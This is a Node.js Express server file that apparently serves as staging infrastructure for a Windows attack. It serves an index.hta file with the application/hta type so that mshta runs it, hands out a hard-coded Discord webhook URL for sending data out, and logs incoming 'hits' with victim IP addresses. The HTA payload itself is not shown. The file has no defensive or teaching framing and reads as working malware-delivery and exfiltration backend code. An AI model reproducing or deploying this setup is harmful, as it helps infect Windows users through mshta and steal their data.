// language: JavaScript, file: server.js, runtime: Node 18+, deps: express
const express = require("express");
const path = require("path");
const fs = require("fs");

const app = express();

app.set("trust proxy", 1);
app.use(express.json({ limit: "2mb" }));

// 1. SERVE THE HTA (Fixes the mshta error)
app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "index.hta");
  // Must be application/hta for mshta to execute it
  res.type("application/hta");
  res.sendFile(filePath);
});

// 2. WEBHOOK ROUTE
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa";

app.get("/wh", (req, res) => {
  res.type("text/plain").send(DISCORD_WEBHOOK);
});

// 3. RECEIVER ROUTE (Optional logging)
app.post("/log", (req, res) => {
  const entry = {
    time: new Date().toISOString(),
    ip: req.ip,
    data: req.body
  };

  try {
    fs.appendFileSync(path.join(__dirname, "hits.log"), JSON.stringify(entry) + "\n");
  } catch (e) {}

  res.sendStatus(204);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});
